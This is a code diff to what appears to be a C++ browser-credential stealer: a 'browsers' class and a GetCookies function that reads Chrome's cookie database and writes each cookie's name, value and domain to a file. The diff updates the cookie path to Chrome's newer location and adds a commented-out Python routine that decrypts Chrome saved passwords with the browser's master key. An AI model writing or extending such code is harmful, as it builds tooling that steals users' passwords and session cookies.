@@ -118,6 +118,36 @@ void browsers::Chromium()
     }
 }
 
+/*
+    def decrypt_password(self,buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = self.generate_cipher(master_key, iv)
+            decrypted_pass = self.decrypt_payload(cipher, payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except:
+            return "Chrome < 80"
+
+    def decrypt_payload(self,cipher, payload):
+        try:
+            return cipher.decrypt(payload)
+        except:
+            pass
+
+
+    def generate_cipher(self,aes_key, iv):
+        try:
+            return AES.new(aes_key, AES.MODE_GCM, iv)
+        except:
+            pass
+*/
+
+
+
+
+
 void browsers::FireFox()
 {
 
@@ -127,7 +157,7 @@ void browsers::FireFox()
 int GetCookies(std::string path, std::string profile)
 {
     // Path to Chrome's cookies database
-    std::string cookiesDbPath = path + "/" + profile+ "/Cookies";
+    std::string cookiesDbPath = path + "/" + profile+ "/Network/Cookies";
 
     // Open the cookies database
     sqlite3* db;
@@ -164,6 +194,8 @@ int GetCookies(std::string path, std::string profile)
         std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
         std::string value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
         std::string domain = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
+
+        std::string domainDec = "";
 
         // Write the cookie details to the file
         outputFile << "Name: " << name << std::endl;
